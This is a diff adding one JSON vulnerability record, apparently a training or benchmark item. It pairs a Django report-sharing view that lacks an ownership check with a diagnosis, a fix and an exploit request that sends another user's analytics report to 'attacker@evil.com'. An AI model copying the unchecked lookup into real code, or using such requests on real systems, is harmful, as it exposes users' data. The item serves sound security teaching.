@@ -1,0 +1,8 @@
+{
+  "vulnerable_code": "report_shared = Signal()\n\ndef share_analytics_report(request):\n    report_id = request.POST.get('report_id')\n    recipient_email = request.POST.get('recipient_email')\n    report = AnalyticsReport.objects.get(id=report_id)\n    report_shared.send(sender=AnalyticsReport, report=report, recipient=recipient_email)\n    return JsonResponse({'status': 'shared'})",
+  "diagnosis": "The view looks up AnalyticsReport by report_id from the POST body without checking if report.created_by == request.user. It fires a custom signal that delivers access tokens for the report, enabling an attacker to exfiltrate any analytics report to their personal email address.",
+  "exploit_request": "POST /api/reports/share/ HTTP/1.1\nHost: analytics.example.com\nCookie: sessionid=attacker_session\nContent-Type: application/x-www-form-urlencoded\n\nreport_id=5521&recipient_email=attacker@evil.com",
+  "corrected_code": "report_shared = Signal()\n\ndef share_analytics_report(request):\n    report_id = request.POST.get('report_id')\n    recipient_email = request.POST.get('recipient_email')\n    report = get_object_or_404(AnalyticsReport, id=report_id, organization=request.user.organization)\n    report_shared.send(sender=AnalyticsReport, report=report, recipient=recipient_email)\n    return JsonResponse({'status': 'shared'})",
+  "severity": "MEDIUM",
+  "confidence": 0.9
+}
